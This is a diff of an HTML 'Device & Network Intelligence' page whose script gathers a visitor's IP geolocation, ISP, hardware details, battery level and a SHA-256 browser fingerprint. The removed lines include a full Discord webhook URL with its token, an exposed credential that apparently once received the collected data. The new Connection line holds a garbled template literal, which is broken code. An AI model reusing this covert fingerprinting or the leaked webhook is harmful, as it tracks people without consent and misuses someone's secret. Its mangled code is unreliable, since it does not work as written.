@@ -52,65 +52,89 @@
         .info-row {
             display: flex;
             justify-content: space-between;
-            padding: 10px 0;
+            padding: 12px 0;
             border-bottom: 1px solid #222;
         }
-        .info-row:last-child {
-            border-bottom: none;
-        }
-        .label {
-            color: #888;
-        }
-        .value {
-            color: #fff;
-            font-weight: 500;
+        .info-row:last-child { border-bottom: none; }
+        .label { color: #888; }
+        .value { 
+            color: #fff; 
+            font-weight: 500; 
             text-align: right;
+            max-width: 60%;
         }
         .fingerprint {
             font-family: monospace;
             word-break: break-all;
             background: #1a1a1a;
-            padding: 12px;
+            padding: 14px;
             border-radius: 8px;
             font-size: 0.95rem;
+            margin-top: 8px;
         }
-        .status {
-            display: inline-block;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 0.85rem;
-        }
-        .online { background: #00c853; color: black; }
-        .loading {
+        .warning {
+            background: #ff9800;
+            color: black;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 0.9rem;
             text-align: center;
-            padding: 40px;
-            font-size: 1.1rem;
         }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1><i class="fas fa-info-circle"></i> System & Visitor Information</h1>
-        <p>Real-time device and network details</p>
+        <h1><i class="fas fa-info-circle"></i> Device & Network Intelligence</h1>
+        <p>Real-time System Information</p>
     </div>
 
-    <div class="container" id="dashboard">
-        <!-- Cards will be populated by JavaScript -->
-    </div>
+    <div class="container" id="dashboard"></div>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1486833700149923880/WlIFJMWJeXMF5QL4xjnM5aKrnmBIFbGCZK8kl8Gh-npMLt5g8F7ejFENqcAu_HO3aPXi";
+        async function getIPData() {
+            // Try ip-api.com first (more reliable)
+            try {
+                const res = await fetch("https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,isp,org,timezone,query");
+                const data = await res.json();
+                if (data.status === "success") {
+                    return {
+                        ip: data.query,
+                        city: data.city,
+                        region: data.regionName,
+                        country: data.country,
+                        isp: data.isp || data.org,
+                        timezone: data.timezone
+                    };
+                }
+            } catch (e) {}
+
+            // Fallback to ipapi.co
+            try {
+                const res = await fetch("https://ipapi.co/json/");
+                const data = await res.json();
+                return {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    isp: data.org,
+                    timezone: data.timezone
+                };
+            } catch (e) {}
+
+            return { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", isp: "Unknown", timezone: "Unknown" };
+        }
 
         async function getFingerprint() {
             const raw = [
                 navigator.userAgent,
                 navigator.language,
-                screen.width,
-                screen.height,
+                screen.width + screen.height,
                 navigator.platform,
                 navigator.hardwareConcurrency || "",
                 navigator.deviceMemory || ""
             ].join("|");
+            
             try {
                 const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
                 return [...new Uint8Array(buf)].map(x => x.toString(16).padStart(2, "0")).join("");
@@ -132,8 +156,7 @@
         }
 
         async function initDashboard() {
-            const ipData = await fetch("https://ipapi.co/json/").then(r => r.json()).catch(() => ({}));
-
+            const ipData = await getIPData();
             const gpu = getGPUInfo();
             const fingerprint = await getFingerprint();
 
@@ -141,7 +164,7 @@
             if (navigator.getBattery) {
                 try {
                     const b = await navigator.getBattery();
-                    battery = `${Math.round(b.level * 100)}%`;
+                    battery = Math.round(b.level * 100) + "%";
                 } catch {}
             }
 
@@ -152,112 +175,88 @@
                 document.body.appendChild(ad);
                 setTimeout(() => {
                     resolve(ad.offsetHeight === 0 ? "Yes" : "No");
-                    document.body.removeChild(ad);
-                }, 100);
+                    ad.remove();
+                }, 120);
             });
 
             const adBlocked = await adBlockTest();
 
-            const info = {
-                location: {
-                    title: "Location",
-                    icon: "📍",
+            const sections = [
+                {
+                    title: "📍 Location",
                     data: {
                         "IP Address": ipData.ip || "Unknown",
                         "City": ipData.city || "Unknown",
                         "Region": ipData.region || "Unknown",
-                        "Country": ipData.country_name || "Unknown",
+                        "Country": ipData.country || "Unknown",
                         "Timezone": ipData.timezone || "Unknown"
                     }
                 },
-                network: {
-                    title: "Network",
-                    icon: "🌐",
+                {
+                    title: "🌐 Network",
                     data: {
-                        "ISP": ipData.org || "Unknown",
-                        "Connection": (navigator.connection?.effectiveType || "Unknown") + " (" + (navigator.connection?.downlink || "?") + " Mbps)",
-                        "Online": navigator.onLine ? "Yes" : "No"
+                        "ISP / Organization": ipData.isp || "Unknown",
+                        "Connection": navigator.connection ? `\( {navigator.connection.effectiveType} ( \){navigator.connection.downlink} Mbps)` : "Unknown",
+                        "Online": navigator.onLine ? "✅ Yes" : "❌ No"
                     }
                 },
-                system: {
-                    title: "System",
-                    icon: "💻",
+                {
+                    title: "💻 System",
                     data: {
-                        "Device Type": /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
+                        "Device": /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop / Laptop",
                         "Platform": navigator.platform,
                         "CPU Threads": navigator.hardwareConcurrency || "Unknown",
-                        "Memory (RAM)": navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
-                        "Touch Support": 'ontouchstart' in window ? "Yes" : "No"
+                        "RAM": navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
+                        "Touch": 'ontouchstart' in window ? "Supported" : "Not Supported"
                     }
                 },
-                display: {
-                    title: "Display & GPU",
-                    icon: "🖥️",
+                {
+                    title: "🖥️ Display & GPU",
                     data: {
-                        "Resolution": `${screen.width} × ${screen.height}`,
-                        "Color Depth": screen.colorDepth + " bit",
+                        "Screen Resolution": `${screen.width} × ${screen.height}`,
                         "Window Size": `${window.innerWidth} × ${window.innerHeight}`,
+                        "Color Depth": screen.colorDepth + " bit",
                         "GPU Renderer": gpu.renderer,
                         "GPU Vendor": gpu.vendor
                     }
                 },
-                browser: {
-                    title: "Browser",
-                    icon: "🌐",
+                {
+                    title: "🌐 Browser",
                     data: {
-                        "Browser": navigator.userAgent.includes("Chrome") ? "Chrome" : 
-                                   navigator.userAgent.includes("Firefox") ? "Firefox" : "Unknown",
+                        "Browser": navigator.userAgent.includes("Chrome") ? "Chrome" : navigator.userAgent.includes("Firefox") ? "Firefox" : "Other",
                         "Language": navigator.language,
                         "Cookies": navigator.cookieEnabled ? "Enabled" : "Disabled",
-                        "Do Not Track": navigator.doNotTrack === "1" ? "Enabled" : "Disabled",
                         "Theme": window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light"
                     }
-                },
-                advanced: {
-                    title: "Advanced",
-                    icon: "🔬",
-                    data: {
-                        "Battery Level": battery,
-                        "AdBlock Detected": adBlocked,
-                        "Fonts Loaded": document.fonts ? document.fonts.size : "Unknown",
-                        "User Agent": navigator.userAgent.substring(0, 80) + "..."
-                    }
                 }
-            };
+            ];
 
-            // Render Dashboard
             const dashboard = document.getElementById("dashboard");
             dashboard.innerHTML = "";
 
-            Object.values(info).forEach(section => {
-                let html = `
-                    <div class="card">
-                        <h2>${section.icon} ${section.title}</h2>
-                `;
+            sections.forEach(section => {
+                let html = `<div class="card"><h2>${section.title}</h2>`;
                 Object.entries(section.data).forEach(([key, value]) => {
                     html += `
                         <div class="info-row">
                             <span class="label">${key}</span>
                             <span class="value">${value}</span>
-                        </div>
-                    `;
+                        </div>`;
                 });
                 html += `</div>`;
                 dashboard.innerHTML += html;
             });
 
-            // Add Fingerprint Card
+            // Fingerprint Card
             const fpCard = document.createElement("div");
             fpCard.className = "card";
             fpCard.innerHTML = `
                 <h2>🔑 Browser Fingerprint</h2>
                 <div class="fingerprint">${fingerprint}</div>
-                <small style="color:#666;">SHA-256 • Unique device identifier</small>
             `;
             dashboard.appendChild(fpCard);
         }
 
-        // Start everything
         window.onload = initDashboard;
     </script>
 </body>
